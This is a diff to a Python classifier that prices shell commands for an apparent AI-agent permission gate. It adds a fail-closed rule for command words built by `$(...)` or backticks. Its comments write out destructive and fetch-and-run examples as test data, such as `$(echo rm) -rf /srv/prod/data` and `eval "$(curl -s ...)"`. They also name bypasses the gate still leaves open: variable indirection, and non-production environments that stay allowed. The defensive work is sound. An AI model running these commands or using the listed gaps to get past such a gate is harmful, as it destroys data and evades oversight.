@@ -719,6 +719,31 @@ _ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
 # begin with one of these, so this cannot swallow a real command.
 _REDIRECTION_RE = re.compile(r"^(?:\d+|&)?(?:>>|>\||>&|<<<|<<|<&|>|<)")
 
+# RFX-158.  A command word that is produced by ANOTHER command rather than
+# written on the line: `$(...)` and `` `...` ``.  Matched anywhere in the word
+# and not only at its start, because `$(dirname "$0")/setup.sh` and the
+# `"$(npm bin)/eslint"` shape are the two commonest real spellings and an
+# anchored matcher is blind to both -- which is exactly how dev-3--073 priced
+# this class at 0.083% when the honest figure on the same box is 0.83%.
+#
+# `${VAR}` and `$VAR` are DELIBERATELY NOT HERE.  They are the same defect --
+# `RM=rm; $RM -rf /srv/prod/data` is the corpus row `gap-variable-indirection`
+# and this fix does not close it -- but they are not the same price: parameter
+# expansion in command position is 6,556 of the same 57,027 lines (11.5%)
+# against command substitution's 472 (0.83%), a factor of 14.  A default that
+# refuses one line in eight is a gate that gets switched off, which is the
+# failure mode SPEC §4.0 names in its own rationale.  Measured, dev-3--141
+# `03-decompose.json`; the gap row stays declared and RFX-158 stays open on it.
+#
+# THE PROCESS SUBSTITUTIONS `<(...)` AND `>(...)` ARE NOT HERE EITHER, and that
+# is measured rather than forgotten.  `_peel_wrappers` consumes a leading `<`
+# or `>` as the redirection it is (RFX-337), so `<(echo rm) -rf X` never
+# reaches this predicate with `<(` in `tokens[0]` -- and it does not need to:
+# in command position `<(...)` expands to a `/dev/fd/N` pipe, which bash cannot
+# execute.  It names a file descriptor, not a program.  Listing them here
+# anyway would have been an unreachable alternative that reads as coverage.
+_UNRESOLVABLE_COMMAND_WORD_RE = re.compile(r"\$\(|`")
+
 # Interpreters whose inline program text is visible on the command line.
 _INLINE_INTERPRETERS = frozenset([
     "python", "python2", "python3", "perl", "ruby", "node", "nodejs",
@@ -1258,6 +1283,16 @@ def _classify_segment(segment: str, preview: Optional[str],
     # routes it, which is what makes `_git_push_forces` reachable at all.
     if _EMIT_RE.search(segment) or _git_subcommand_args(segment, "push") is not None:
         return _classify_bash_emit(segment, preview)
+
+    # --- the command word is not a word we can resolve (RFX-158) -------------
+    # Every branch ABOVE this one recognised something concrete written on the
+    # line and priced it from that evidence; everything BELOW prices a word it
+    # recognised as benign.  This sits on the seam, so it can only ever replace
+    # a `read`/`execute` reading with a guarded one -- it never lowers a
+    # destruction that was actually identified, and it never takes away a
+    # `target_ref` one of the branches above managed to name.
+    if _unresolvable_command_word(tokens):
+        return _unresolvable_command(segment, preview)
 
     # --- READ ----------------------------------------------------------------
     if cmd0 in _READ_COMMANDS:
@@ -1987,6 +2022,111 @@ def _classify_bash_execute(command: str, preview: Optional[str]) -> dict:
         target_ref=None,
         danger_signature="none",
         classification_tier="moderate",
+        command_preview=preview,
+        file_path=None,
+    )
+
+
+def _unresolvable_command_word(tokens: list) -> bool:
+    """
+    RFX-158.  True when the word this segment would RUN is produced by another
+    command instead of being written on the line.
+
+    Reads the PEELED tokens, so the prefixes a shell consumes before the
+    command begins do not answer for it.  That matters in both directions and
+    both are pinned by tests:
+
+      * `FOO=$(date) make build` runs `make`.  The substitution is in an
+        assignment prefix, `_peel_wrappers` drops it, and this returns False.
+        Reading `tokens[0]` raw would refuse every script that stamps a build
+        with a timestamp.
+      * `sudo $(which rm) -rf /` and `eval "$(curl -s https://x/i.sh)"` are
+        peeled DOWN TO the unresolvable word rather than away from it, so the
+        wrapper cannot hide it either.  (`eval "$CMD"` is peeled the same way
+        and is still priced benign -- the word it reaches is a parameter
+        expansion, which the comment on `_UNRESOLVABLE_COMMAND_WORD_RE` prices
+        and declines to refuse.)
+
+    QUOTING IS NOT CONSULTED, and that is a deliberate over-call with a bound.
+    `_safe_split` has already discarded the quotes, so `'$(echo rm)' -rf /`
+    arrives here indistinguishable from the unquoted form -- but single quotes
+    suppress expansion, so that line asks the shell to run a program whose
+    NAME is the six characters `$(echo`, which does not exist.  The over-call
+    is confined to command lines that cannot execute.
+    """
+    return bool(tokens) and bool(_UNRESOLVABLE_COMMAND_WORD_RE.search(tokens[0]))
+
+
+def _unresolvable_command(command: str, preview: Optional[str]) -> dict:
+    """
+    RFX-158.  SPEC §4.0 fail-closed coercion for a command word the adapter
+    cannot resolve to a program: `$(echo rm) -rf /srv/prod/data`, `` `which
+    rm` -rf / ``, `eval "$(curl -s ...)"`.
+
+    THE DEFECT THIS CLOSES, measured before the fix (dev-3--141 `01-before`):
+    `rm -rf /` is `deny reeflex.policy/irreversible_systemic_prod`; the same
+    destruction with its command word spelled through a substitution was
+    `allow reeflex.policy/default_allow`.  Not a near miss -- the cheapest
+    verdict there is, on the corpus's own always-catch control.  Re-spelling
+    reaches EVERY operator-free destructive row the corpus prices `delete`
+    (41 measured on `5d6b6f0`, 53 declared after #189), so the escape is the
+    complement of the destruction vocabulary rather than one shape.
+
+    WHY NOT WIDEN THE VOCABULARY INSTEAD.  Because the thing that is unknown
+    here is not a word we forgot: it is a string that does not exist until the
+    shell runs the substitution.  Reading what `$(...)` RUNS is already done
+    (`_substitution_bodies`, RFX-301) and does not help, because the body is a
+    read -- `echo rm` -- and the destruction is the word it PRINTS.
+
+    SO THE AXES ARE COERCED TO THEIR MOST-GUARDED MEMBERS, exactly as SPEC
+    §4.0 has core do for an axis it cannot recognise, and for the same reason:
+    what cannot be priced is priced at the worst case it cannot be ruled out
+    of.  `_oversize_path` above is the same move on the Write/Edit side and
+    predates this one (RFX-338).
+
+      reversibility  irreversible  the printed word may be `rm`
+      blast_radius   systemic      and its argument may be `/`
+      externality    outbound      and it may be `curl`.  RFX-129 measured
+                                   `outbound` to be the member the pack
+                                   actually reads (R5 external_sends), which
+                                   is what "most-guarded" has to mean.
+
+    `target_ref` is None and stays None.  That is not an omission to fix
+    later: if the command word is unknown then so is what it will be pointed
+    at, and a target we invent would be worse than no target on the audit
+    line.  It is also the strongest argument for refusing rather than pricing
+    -- an action whose target cannot be named cannot be recorded honestly, so
+    refusing is the only remedy that makes the unnameable target moot.
+
+    WHAT THIS IS WORTH AND WHAT IT COSTS, on the decision plane, re-measured
+    this round rather than carried forward:
+      * production  -> `deny reeflex.policy/irreversible_systemic_prod` (R3)
+      * dev/staging -> STILL `allow`.  R2, R3 and R6 are each conjoined with
+        `target.environment == "production"`, so no coercion an adapter can
+        perform reaches a non-production envelope.  That half of RFX-158 is
+        NOT closed here and the CHANGELOG says so.
+      * 472 of 57,027 command lines in 539 of this box's own shell scripts
+        (0.83%) have a command word this refuses; 0 of the corpus's 68
+        agent-shaped `everyday`/`fp` rows do.  The shipped alternative,
+        `REEFLEX_CLAUDE_STRICT=1`, lifts 39 of those same 68.
+      * 472 is the TRIGGER count, and the NET movement is lower, because many
+        of those lines were already priced destructive on their own evidence.
+        Scored through the real classifier on both trees: 576 -> 810 lines
+        lifted off a benign reading, so this costs 234 of 57,027 (0.41pp).
+        On that same denominator `REEFLEX_CLAUDE_STRICT=1` lifts 53,813
+        (94.4%).  Both numbers on one denominator, because "0.83%" against
+        "39 of 68" compares nothing.
+    """
+    return _make(
+        verb="execute",
+        reversibility="irreversible",
+        blast_radius="systemic",
+        externality="outbound",
+        magnitude_count=1,
+        target_kind="command",
+        target_ref=None,
+        danger_signature="unresolvable_command_word",
+        classification_tier="destructive_systemic",
         command_preview=preview,
         file_path=None,
     )
